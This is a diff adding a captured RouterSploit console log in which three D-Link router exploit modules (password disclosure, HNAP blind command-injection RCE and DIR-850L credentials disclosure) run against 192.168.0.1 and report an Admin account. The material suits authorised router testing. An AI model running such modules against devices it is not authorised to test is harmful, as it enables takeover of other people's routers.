@@ -1,0 +1,47 @@
+ ______            _            _____       _       _ _
+ | ___ \          | |          /  ___|     | |     (_) |
+ | |_/ /___  _   _| |_ ___ _ __\ `--. _ __ | | ___  _| |_
+ |    // _ \| | | | __/ _ \ '__|`--. \ '_ \| |/ _ \| | __|
+ | |\ \ (_) | |_| | ||  __/ |  /\__/ / |_) | | (_) | | |_
+ \_| \_\___/ \__,_|\__\___|_|  \____/| .__/|_|\___/|_|\__|
+                                     | |
+       Exploitation Framework for    |_|    by Threat9
+            Embedded Devices
+
+ Codename   : I Knew You Were Trouble
+ Version    : 3.4.1
+ Homepage   : https://www.threat9.com - @threatnine
+ Join Slack : https://www.threat9.com/slack
+
+ Join Threat9 Beta Program - https://www.threat9.com
+
+ Exploits: 132 Scanners: 4 Creds: 171 Generic: 4 Payloads: 32 Encoders: 6
+
+[4mrsf[0m > [4mrsf[0m ([91mD-Link DIR-8XX Password Disclosure[0m) > [92m[+][0m target => 192.168.0.1
+[4mrsf[0m ([91mD-Link DIR-8XX Password Disclosure[0m) > [94m[*][0m Running module exploits/routers/dlink/dir_8xx_password_disclosure...
+[92m[+][0m Target seems to be vulnerable
+
+   User ID     Username     Password     
+   -------     --------     --------     
+               Admin                     
+
+[4mrsf[0m ([91mD-Link DIR-8XX Password Disclosure[0m) > [4mrsf[0m ([91mD-Link Multi HNAP RCE[0m) > [92m[+][0m target => 192.168.0.1
+[4mrsf[0m ([91mD-Link Multi HNAP RCE[0m) > [94m[*][0m Running module exploits/routers/dlink/multi_hnap_rce...
+[94m[*][0m Target might be vulnerable - it is hard to verify
+[94m[*][0m Invoking command loop...
+[94m[*][0m It is blind command injection, response is not available
+
+[92m[+][0m Welcome to cmd. Commands are sent to the target via the execute method.
+[94m[*][0m For further exploitation use 'show payloads' and 'set payload <payload>' commands.
+
+[4mcmd[0m > [4mrsf[0m ([91mD-Link Multi HNAP RCE[0m) > [4mrsf[0m ([91mD-Link DIR-850L Creds Disclosure[0m) > [92m[+][0m target => 192.168.0.1
+[4mrsf[0m ([91mD-Link DIR-850L Creds Disclosure[0m) > [94m[*][0m Running module exploits/routers/dlink/dir_850l_creds_disclosure...
+[92m[+][0m Target seems to be vulnerable
+
+   Username     Password     
+   --------     --------     
+   Admin                     
+
+[91m[-][0m Target does not seem to be vulnerable
+[4mrsf[0m ([91mD-Link DIR-850L Creds Disclosure[0m) > 
+[91m[-][0m RouterSploit stopped
